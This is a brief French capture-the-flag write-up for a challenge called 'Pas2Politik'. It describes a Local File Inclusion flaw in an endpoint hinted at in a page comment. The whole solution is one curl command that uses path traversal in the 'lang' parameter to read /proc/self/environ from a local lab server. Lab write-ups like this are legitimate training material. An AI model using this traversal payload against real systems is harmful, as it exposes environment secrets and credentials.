# Pas2Politik

Le but ici est d'exploiter une faille Local File Inclusion (ou Read) via un endpoint trouver dans le commentaire de la page principale.
Pour récupérer le flag il faudra aller chercher les variables d'envrionement du processus 

Resolve : 

```sh
curl http://localhost:8000/ctf?lang=../../../../../proc/self/environ --output -
```
